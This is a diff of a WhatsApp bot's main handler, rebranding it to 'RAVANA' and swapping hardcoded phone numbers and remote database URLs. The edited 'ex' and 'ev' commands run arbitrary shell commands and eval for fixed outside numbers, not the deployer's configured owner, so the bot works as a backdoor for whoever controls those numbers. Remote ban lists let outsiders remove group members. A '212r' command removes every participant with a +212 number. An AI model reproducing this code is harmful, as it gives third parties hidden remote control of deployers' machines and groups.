@@ -859,7 +859,12 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-const banbn = await fetchJson(`https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/ban_number.json`)
+
+
+
+	    
+//============================================================================ 
+const banbn = await fetchJson(`https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/ban_number.json`)
 const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
@@ -876,7 +881,7 @@ const isBanGrp = [ ...gpIdz ]
 
 
 const banGroups = await fetchJson(
-  "https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/ban_group.json"
+  "https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/ban_group.json"
 );          // banGroups === [ "1203...", ... ]
 
 const isBanvisper = banGroups
@@ -894,9 +899,9 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/react.json')).data
+const rec = (await axios.get('https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/react.json')).data
 
-const recc = (await axios.get('https://raw.githubusercontent.com/Ravana-LK/databases/refs/heads/main/main_var.json')).data
+const recc = (await axios.get('https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/main_var.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
@@ -906,13 +911,10 @@ await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
 await conn.newsletterReactMessage(`120363405102534270@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94777145463")){
+if(senderNumber.includes("94754871798")){
 if(isReact) return
-m.react(`${rec.sadas}`)
+m.react(`${rec.dileesha}`)
 }
-
-		
-// Only Admin bot Admin Bot React
 		
 const ownNum = config.OWNER_NUMBER;
 
@@ -955,7 +957,7 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by GOJO MD TEAM ❌*" })
+	return await conn.sendMessage(from, { text: "*You are banned by RAVANA TEAM ❌*" })
 }
 
 	
@@ -1291,12 +1293,12 @@ if(!isOwner) {
     if(originalMessage.message.stickerMessage){
      
     //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
-     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-PRO 🌟'})
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-X-PRO 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
     
     }else{
     
-    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-PRO 🌟'})
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'RAVANA-X-MD 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
     
       }
@@ -1342,7 +1344,7 @@ if(!isOwner) {
   //==================================================================================================================================================================== 
 
 //==================================================================================================================================================================
-const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`);
+const bad = await fetchJson(`https://raw.githubusercontent.com/RAVANA-PRODUCT/database/refs/heads/main/bad_word.json`);
 
 if (config.ANTI_BAD === "true" && isGroup) { // Run only in groups
   if (!isMe && !groupAdmins.includes(sender)) { // Only non-admins
@@ -1666,7 +1668,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94743826406) {
+      if(senderNumber == 94754871798) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1678,7 +1680,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94743826406) {
+      if(senderNumber == 94754871798) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1699,7 +1701,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94743826406) {
+      if(senderNumber == 94754871798) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1714,7 +1716,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94743826406 || senderNumber == 94777145463) {
+    if(senderNumber == 94754871798 || senderNumber == 94771098429) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1741,9 +1743,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("🎯 SAYURA MD DL Working successfully!");
+  res.send("RAVANA-XPRO Working successfully!");
 });
-app.listen(port, () => console.log(`Sayura-System-Download Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Ravana-Xpro Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
@@ -1758,3 +1760,13 @@ process.on("uncaughtException", function (err) {
   if (e.includes("Authentication timed out")) restart();
   console.log("Caught exception: ", err);
 });
+
+
+
+
+
+
+	    
+    
+
+  
